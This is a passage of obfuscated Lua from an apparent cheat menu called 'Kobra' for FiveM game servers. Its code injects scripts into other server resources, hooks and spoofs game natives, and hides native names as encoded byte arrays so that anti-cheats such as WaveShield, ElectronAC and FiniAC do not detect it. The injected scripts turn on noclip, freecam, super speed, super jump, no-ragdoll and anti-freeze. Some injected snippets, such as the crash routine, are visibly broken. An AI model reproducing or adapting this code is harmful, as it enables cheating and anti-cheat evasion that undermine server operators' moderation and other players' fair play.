end end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                _G.KobraNoclipSpeed = ]]   .. v344   .. [[
                                if not _G.KobraNoclipThreadRunning then
                                    _G.KobraNoclipEnabled = true
                                    _G.KobraNoclipThreadRunning = true

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                    end

                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                    hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)

                                    local function initFlow(cb)
                                        local co = coroutine.create(cb)
                                        -- iterative, non-recursive executor to avoid stack growth
                                        local ok, err
                                        while coroutine.status(co) ~= "dead" do
                                            ok, err = coroutine.resume(co)
                                            if not ok then
                                                print("Coroutine error:", err)
                                                break
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end

                                    initFlow(function()
                                        while _G.KobraNoclipThreadRunning do
                                            Wait(0)
                                            if not _G.KobraNoclipEnabled then
                                                Wait(500)
                                                goto continue
                                            end

                                            local ped = GetPlayerPed(-1)
                                            if not DoesEntityExist(ped) then goto continue end

                                            local vehicle = GetVehiclePedIsIn(ped, false)
                                            local entity = (vehicle ~= 0 and vehicle) or ped
                                            if not DoesEntityExist(entity) then goto continue end

                                            local coords = GetEntityCoords(entity, true)
                                            local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                            local pitch = GetGameplayCamRelativePitch()

                                            -- convert once and reuse
                                            local radH = heading * math.pi / 180.0
                                            local radP = pitch * math.pi / 180.0

                                            local dx = -math.sin(radH)
                                            local dy = math.cos(radH)
                                            local dz = math.sin(radP)
                                            local len = math.sqrt(dx*dx + dy*dy + dz*dz)
                                            if len ~= 0 then
                                                dx = dx / len
                                                dy = dy / len
                                                dz = dz / len
                                            end

                                            local speed = _G.KobraNoclipSpeed or 0.25
                                            -- cache control checks to avoid repeating native calls
                                            local sprint = IsControlPressed(0, 21)
                                            local slow = IsControlPressed(0, 19)
                                            if sprint then speed = speed + 1 end
                                            if slow then speed = 0.10 end

                                            local forward = IsControlPressed(0, 32)
                                            local back = IsControlPressed(0, 269)
                                            local left = IsControlPressed(0, 34)
                                            local right = IsControlPressed(0, 9)
                                            local up = IsControlPressed(0, 22)
                                            local down = IsControlPressed(0, 62)

                                            if forward then
                                                coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                            elseif back then
                                                coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                            end

                                            if left then
                                                coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                            elseif right then
                                                coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                            end

                                            if up then
                                                coords = coords + vector3(0.0, 0.0, speed)
                                            elseif down then
                                                coords = coords - vector3(0.0, 0.0, speed)
                                            end

                                            SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                            SetEntityHeading(entity, heading)
                                            ::continue::
                                        end
                                    end)
                                else
                                    _G.KobraNoclipEnabled = true
                                    _G.KobraNoclipSpeed = ]]   .. v344   .. [[
                                end
                            ]] );elseif ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started")) then MachoInjectResource2(1 + 2 ,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            local function GetRightVector(rot)
                                                local z = math.rad(rot.z)
                                                return vector3(math.cos(z), math.sin(z), 0.0)
                                            end

                                            local function Clamp(val, min, max)
                                                if val < min then return min end
                                                if val > max then return max end
                                                return val
                                            end

                                            local function GetGroundZForCoords(x, y, z)
                                                local found, groundZ = GetGroundZFor_3dCoord(x, y, z, false)
                                                if found then return groundZ end
                                                return z
                                            end

                                            if not _G.inNoClip then
                                                _G.inNoClip = true
                                                _G.noclipping = true
                                                _G.KobraNoclipSpeed = ]]   .. v344   .. [[
                                                _G.noclipCamera = nil
                                                _G.cameraReady = false
                                                _G.originalCoords = nil

                                                local function StartNoclip()
                                                    local playerPed = PlayerPedId()
                                                    _G.originalCoords = GetEntityCoords(playerPed)
                                                    _G.noclipCamera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                                                    SetCamCoord(_G.noclipCamera, _G.originalCoords.x, _G.originalCoords.y, _G.originalCoords.z + 1.0)
                                                    SetCamRot(_G.noclipCamera, 0.0, 0.0, GetEntityHeading(playerPed), 2)
                                                    RenderScriptCams(true, false, 0, true, true)
                                                    SetEntityVisible(playerPed, false, false)
                                                    SetEntityInvincible(playerPed, true)
                                                    SetEntityCollision(playerPed, false, false)
                                                    TaskStandStill(playerPed, -1)
                                                    CreateThread(function()
                                                        Wait(550)
                                                        _G.cameraReady = true
                                                    end)
                                                end

                                                local function Movement()
                                                    if not _G.noclipCamera or not _G.cameraReady then return end
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local camRot = GetCamRot(_G.noclipCamera, 2)
                                                    local speed = _G.KobraNoclipSpeed or ]]   .. v344   .. [[
                                                    if IsControlPressed(0, 21) then speed = speed + 1 end
                                                    if IsControlPressed(0, 19) then speed = 0.10 end
                                                    local forward = RotationToDirection(camRot)
                                                    local right = GetRightVector(camRot)
                                                    local moveX, moveY, moveZ = 0, 0, 0
                                                    if IsControlPressed(0, 32) then
                                                        moveX = moveX + forward.x * speed
                                                        moveY = moveY + forward.y * speed
                                                        moveZ = moveZ + forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 269) then
                                                        moveX = moveX - forward.x * speed
                                                        moveY = moveY - forward.y * speed
                                                        moveZ = moveZ - forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 34) then
                                                        moveX = moveX - right.x * speed
                                                        moveY = moveY - right.y * speed
                                                    end
                                                    if IsControlPressed(0, 9) then
                                                        moveX = moveX + right.x * speed
                                                        moveY = moveY + right.y * speed
                                                    end
                                                    if IsControlPressed(0, 22) then
                                                        moveZ = moveZ + speed
                                                    end
                                                    if IsControlPressed(0, 62) then
                                                        moveZ = moveZ - speed
                                                    end
                                                    SetCamCoord(_G.noclipCamera, camCoords.x + moveX, camCoords.y + moveY, camCoords.z + moveZ)
                                                    local x = GetDisabledControlNormal(0, 1)
                                                    local y = GetDisabledControlNormal(0, 2)
                                                    local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                                                    local newYaw = camRot.z - x * 5
                                                    SetCamRot(_G.noclipCamera, newPitch, camRot.y, newYaw, 2)
                                                    SetFocusPosAndVel(camCoords.x, camCoords.y, camCoords.z, 0.0, 0.0, 0.0)
                                                end

                                                CreateThread(function()
                                                    StartNoclip()
                                                    while _G.inNoClip do
                                                        Wait(0)
                                                        if _G.noclipping then
                                                            Movement()
                                                        else
                                                            Wait(500)
                                                        end
                                                    end
                                                end)
                                            else
                                                _G.noclipping = true
                                                _G.KobraNoclipSpeed = ]]   .. v344   .. [[
                                            end
                                        ]] );else MachoInjectResource2(2 + 1 ,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.KobraNoclipSpeed = ]]   .. v344   .. [[
                                            if not _G.KobraNoclipThreadRunning then
                                                _G.KobraNoclipEnabled = true
                                                _G.KobraNoclipThreadRunning = true
                                                function hNative(nativeName, newFunction)
                                                    local originalNative = _G[nativeName]
                                                    if not originalNative or type(originalNative) ~= "function" then return end
                                                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                                end
                                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsPedFalling", function(originalFn, ...) return true end)
                                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                                hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                                hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                                hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)
                                                CreateThread(function()
                                                    while _G.KobraNoclipThreadRunning do
                                                        Wait(0)
                                                        if not _G.KobraNoclipEnabled then
                                                            Wait(500)
                                                            goto continue
                                                        end
                                                        local ped = PlayerPedId()
                                                        if not DoesEntityExist(ped) then goto continue end
                                                        local vehicle = GetVehiclePedIsIn(ped, false)
                                                        local entity = (vehicle ~= 0 and vehicle) or ped
                                                        if not DoesEntityExist(entity) then goto continue end
                                                        local coords = GetEntityCoords(entity, true)
                                                        local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                                        local pitch = GetGameplayCamRelativePitch()
                                                        local dx = -math.sin(heading * math.pi / 180.0)
                                                        local dy = math.cos(heading * math.pi / 180.0)
                                                        local dz = math.sin(pitch * math.pi / 180.0)
                                                        local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                                                        if len ~= 0 then
                                                            dx, dy, dz = dx / len, dy / len, dz / len
                                                        end
                                                        local speed = _G.KobraNoclipSpeed or 0.25
                                                        if IsControlPressed(0, 21) then speed = speed + 1 end
                                                        if IsControlPressed(0, 19) then speed = 0.10 end
                                                        if IsControlPressed(0, 32) then
                                                            coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 269) then
                                                            coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 34) then
                                                            coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 9) then
                                                            coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 22) then
                                                            coords = coords + vector3(0.0, 0.0, speed)
                                                        end
                                                        if IsControlPressed(0, 62) then
                                                            coords = coords - vector3(0.0, 0.0, speed)
                                                        end
                                                        SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                                        SetEntityHeading(entity, heading)
                                                        ::continue::
                                                    end
                                                end)
                                            else
                                                _G.KobraNoclipEnabled = true
                                                _G.KobraNoclipSpeed = ]]   .. v344   .. [[
                                            end
                                        ]] );end elseif (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                    _G.KobraNoclipEnabled = false
                                    _G.KobraNoclipThreadRunning = false
                                ]]);elseif ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started")) then MachoInjectResource2(7 -4 ,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            if _G.inNoClip then
                                                _G.inNoClip = false
                                                _G.noclipping = false
                                                _G.cameraReady = false
                                                local playerPed = PlayerPedId()
                                                if _G.noclipCamera then
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local valid, groundZ = GetGroundZFor_3dCoord(camCoords.x, camCoords.y, camCoords.z, false)
                                                    local targetCoords
                                                    if valid and camCoords.z > -1000.0 and camCoords.z < 10000.0 then
                                                        targetCoords = vector3(camCoords.x, camCoords.y, groundZ + 1.0)
                                                    else
                                                        targetCoords = GetEntityCoords(playerPed)
                                                    end
                                                    SetEntityCoordsNoOffset(playerPed, targetCoords.x, targetCoords.y, targetCoords.z, true, true, true)
                                                    RenderScriptCams(false, false, 0, true, true)
                                                    DestroyCam(_G.noclipCamera, false)
                                                    _G.noclipCamera = nil
                                                else
                                                    local pedCoords = GetEntityCoords(playerPed)
                                                    SetEntityCoordsNoOffset(playerPed, pedCoords.x, pedCoords.y, pedCoords.z, true, true, true)
                                                end
                                                SetEntityVisible(playerPed, true, true)
                                                SetEntityInvincible(playerPed, false)
                                                SetEntityCollision(playerPed, true, true)
                                                ClearPedTasksImmediately(playerPed)
                                                SetFocusEntity(playerPed)
                                            end
                                        ]]);else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.KobraNoclipEnabled = false
                                            _G.KobraNoclipThreadRunning = false
                                        ]]);end end},{type="slider-checkbox",label="Freecam",scrollType="onScroll",checked=false,value=0.25 + 0 ,step=0.25 -0 ,min=1710.25 -(1596 + 114) ,max=12 -7 ,onSelect=function(v346,v347) v277:ToggleFreecam(v347,v346);end},{type="checkbox",label="Fast Run",checked=false,onSelect=function(v348) if v348 then v12:Notify("success","Kobra","Fast Run On",4438 -(1059 + 379) );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.fastRunEnabled then
                                                _G.fastRunEnabled = true

                                                local GetPlayerPed_fn = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                                local SetRun_fn = g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})
                                                local SetPedMove_fn = g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})
                                                local Wait_fn = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[FastRun] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(1)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.fastRunEnabled do
                                                        local ped = GetPlayerPed_fn(-1)
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(ped, 1.49)
                                                            SetPedMove_fn(ped, 1.49)
                                                        end
                                                        Wait_fn(1)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            if _G.FastRunActive == nil then _G.FastRunActive = false end
                                            if _G.FastRunThread == nil then
                                                _G.FastRunThread = true

                                                local CreateThread_fn = CreateThread
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetRun_fn = SetRunSprintMultiplierForPlayer
                                                local SetMove_fn = SetPedMoveRateOverride

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait(0)
                                                        if not _G.FastRunActive then
                                                            Wait(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(PlayerId(), 1.49)
                                                            SetMove_fn(ped, 1.49)
                                                        end
                                                        ::continue::
                                                    end
                                                end)
                                            end

                                            _G.FastRunActive = true
                                        ]]);end else local v591=0 -0 ;while true do if (v591==0) then v12:Notify("error","Kobra","Fast Run Off",3000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.fastRunEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                return _G[decode(n)]
                                            end
                                            g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                            g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})(g({80,108,97,121,101,114,80,101,100,73,100})(), 1.0)
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            _G.FastRunActive = false
                                            SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                                            SetPedMoveRateOverride(PlayerPedId(), 1.0)
                                        ]]);end break;end end end end},{type="checkbox",label="Super Jump",checked=false,onSelect=function(v349) local v350=GetResourceState("WaveShield")=="started" ;local function v351(v531) local v532=0 + 0 ;local v533;while true do if (v532==(0 + 0)) then v533="";for v853=393 -(145 + 247) , #v531 do v533=v533   .. string.char(v531[v853]) ;end v532=1;end if (v532==(1 + 0)) then return v533;end end end local function v352(v534) return _G[v351(v534)];end local function v353() if  not _G.superJumpEnabled then _G.superJumpEnabled=true;v352({67,337 -223 ,101,157 -60 ,676 -(544 + 16) ,729 -(294 + 334) ,37 + 47 ,391 -287 ,59 + 55 ,895 -(413 + 381) ,206 -109 ,259 -159 })(function() while _G.superJumpEnabled do v352({83,171 -70 ,116,245 -162 ,737 -(47 + 573) ,475 -363 ,163 -62 ,606 -(76 + 416) ,74,1124 -(564 + 443) ,109,112,84,346 -242 ,45 + 60 ,1932 -(772 + 1045) ,214 -(102 + 42) ,1384 -(1049 + 221) ,237 -140 ,457 -(136 + 212) ,429 -328 })(v352({65 + 15 ,100 + 8 ,1701 -(240 + 1364) ,431 -310 ,101,1169 -(331 + 724) ,717 -(269 + 375) ,100})());Wait(0 + 0 );end end);end end local function v354() _G.superJumpEnabled=false;v352({901 -(667 + 151) ,1998 -(1504 + 393) ,116,83,303 -186 ,112,13 + 88 ,1781 -(728 + 939) ,74,117,249 -140 ,112,84,104,105,99 + 16 ,1836 -(459 + 1307) ,114,97,109,1 + 100 })(v352({11 + 69 ,360 -252 ,97,104 + 17 ,80 + 21 ,114,73,46 + 54 })(),1);end if v349 then if v350 then v353();else MachoInjectResourceRaw("any",[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superJumpEnabled then
                                                _G.superJumpEnabled = true
                                                g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                                                    while _G.superJumpEnabled do
                                                        g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})())
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                        ]]);end elseif v350 then local v791=0 + 0 ;while true do if (v791==0) then print("off");v354();break;end end else MachoInjectResourceRaw("any",[[
                                            _G.superJumpEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                        ]]);end end}}},{label="Miscellaneous",tabs={{icon="",type="button",label="Crash Game",desc="Crashes your game",onSelect=function() MachoInjectResourceRaw("any",[[
                        function SimpleJsonEncode(value)
                            if type(value) == "table" then
                                local parts = {}
                                local isArray = true
                                local maxIndex = 0

                                for k, _ in pairs(value) do
                                    if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                        isArray = false
                                        break
                                    end
                                    maxIndex = math.max(maxIndex, k)
                                end
                                
                                if isArray then
                                    for i = 1, maxIndex do
                                        local v = value[i]
                                        if v == nil then
                                            parts[i] = "null"
                                        else
                                            parts[i] = SimpleJsonEncode(v)
                                        end
                                    end
                                    return "[" .. table.concat(parts, ",") .. "]"
                                else
                                    for k, v in pairs(value) do
                                        if type(k) == "string" then
                                            local encodedValue = SimpleJsonEncode(v)
                                            parts[#parts + 1] = "\"" .. k .. "\":" .. encodedValue
                                        end
                                    end
                                    return "{" .. table.concat(parts, ",") .. "}"
                                end
                            elseif type(value) == "string" then
                                return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                            elseif type(value) == "number" or type(value) == "boolean" then
                                return tostring(value)
                            elseif value == nil then
                                return "null"
                            else
                                return "\"[unserializable:" .. type(value) .. "]\""
                            end
                        end

                        function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                local info = debug.getinfo(2, "Sln")
                                return newFunction(originalNative, ...)
                            end
                        end

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)
                        ]]);end},{icon="",type="button",label="Clear Screen Effects",desc="Removes all screen effects",onSelect=function() print("Revive");end},{icon="",type="button",label="Suicide",desc="This will kill you.",onSelect=function() local v355=0 -0 ;local v356;while true do if (v355==1) then v356();break;end if (v355==0) then v356=nil;function v356() local v792=SetEntityHealth;v792(PlayerPedId(),0 -0 );end v355=1;end end end},{icon="",type="button",label="Force Ragdoll",desc="This will ragdoll.",onSelect=function() MachoInjectResourceRaw("any",[[
                            local function awfAEDSADWEf()
                                local cWAmdjakwDksFD = SetPedToRagdoll
                                cWAmdjakwDksFD(PlayerPedId(), 3000, 3000, 0, false, false, false)
                            end

                            awfAEDSADWEf()
                            ]]);end},{icon="",type="button",label="Remove Crutch",desc="Remove Crutch is the server is using the correct resource",onSelect=function() MachoResourceStop("wasabi_crutch");end},{icon="",type="scrollable",value=1 + 0 ,values={"Primary","Secondary"},label="Clear Tasks",desc="Clears the character's tasks",onSelect=function(v357) if (v357=="Primary") then ClearPedTasksImmediately(PlayerPedId());elseif (v357=="Secondary") then ClearPedSecondaryTask(PlayerPedId());end end},{type="divider",label="Toggles"},{type="checkbox",label="No Ragdoll",checked=false,desc="This will prevent you from being ragdolled from admins or cheaters.",onSelect=function(v358) local v359=36 -(13 + 23) ;local v360;local v361;while true do if (v359==(1 -0)) then if v358 then if v360 then v12:Notify("success","Kobra","No Ragdoll Enabled",4310 -1310 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local setCanRagdoll = SetPedCanRagdoll
                                                local setRagdollOnCollision = SetPedRagdollOnCollision
                                                local setRagdollFromImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRagdoll = IsPedRagdoll
                                                local clearTasks = ClearPedTasksImmediately

                                                while noRagdollEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 then
                                                        setCanRagdoll(ped, false)
                                                        setRagdollOnCollision(ped, false)
                                                        setRagdollFromImpact(ped, false)
                                                        if isRagdoll(ped) then
                                                            clearTasks(ped)
                                                        end
                                                    end
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    setCanRagdoll(ped, true)
                                                    setRagdollOnCollision(ped, true)
                                                    setRagdollFromImpact(ped, true)
                                                end
                                            end)
                                        ]]);else v48(v361,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedRagdollOnCollision", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdollFromPlayerImpact", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function startNoRagdoll()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local setCan = SetPedCanRagdoll
                                                local setColl = SetPedRagdollOnCollision
                                                local setImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRag = IsPedRagdoll
                                                local clear = ClearPedTasksImmediately

                                                create(function()
                                                    while noRagdollEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 then
                                                            setCan(ped, false)
                                                            setColl(ped, false)
                                                            setImpact(ped, false)
                                                            if isRag(ped) then
                                                                clear(ped)
                                                            end
                                                        end
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = pedId()
                                                    if ped and ped ~= 0 then
                                                        setCan(ped, true)
                                                        setColl(ped, true)
                                                        setImpact(ped, true)
                                                    end
                                                end)
                                            end

                                            startNoRagdoll()
                                        ]]);v12:Notify("success","Kobra","No Ragdoll Enabled (Fallback)",5450 -2450 );end elseif v360 then local v985=1088 -(830 + 258) ;while true do if (v985==(0 -0)) then v12:Notify("success","Kobra","No Ragdoll Disabled",1877 + 1123 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            noRagdollEnabled = false
                                        ]]);break;end end else local v986=0 + 0 ;while true do if (v986==(1441 -(860 + 581))) then v48(v361,[[
                                            noRagdollEnabled = false
                                        ]]);v12:Notify("success","Kobra","No Ragdoll Disabled (Fallback)",3000);break;end end end break;end if (v359==(0 -0)) then v360=GetResourceState("WaveShield")=="started" ;v361=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v359=1;end end end},{type="checkbox",label="Anti-Freeze",checked=false,desc="This will prevent you from being frozen.",onSelect=function(v362) local v363=241 -(237 + 4) ;local v364;local v365;while true do if ((2 -1)==v363) then if v362 then if v364 then v12:Notify("success","Kobra","Anti-Freeze Enabled",7590 -4590 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clearTasks = ClearPedTasks

                                                while antiFreezeEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 and isFrozen(ped) then
                                                        unfreeze(ped, false)
                                                        clearTasks(ped)
                                                    end
                                                end
                                            end)
                                        ]]);else local v987=0 -0 ;while true do if (v987==(0 + 0)) then v48(v365,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasks", function(originalFn, ...) return originalFn(...) end)
